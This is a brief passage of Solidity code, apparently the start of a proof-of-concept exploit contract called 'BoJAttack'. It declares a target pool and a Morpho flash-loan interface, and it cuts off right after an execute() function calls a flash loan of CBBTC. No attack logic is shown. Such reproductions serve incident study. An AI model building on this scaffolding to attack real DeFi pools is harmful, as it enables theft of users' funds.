contract BoJAttack {
    IBoJPool private constant pool = IBoJPool(BOJ_POOL);
    IMorphoBuleFlashLoan private constant morpho = IMorphoBuleFlashLoan(MORPHO);

    function execute() external {
        morpho.flashLoan(address(CBBTC), 10_537_110_432, "");
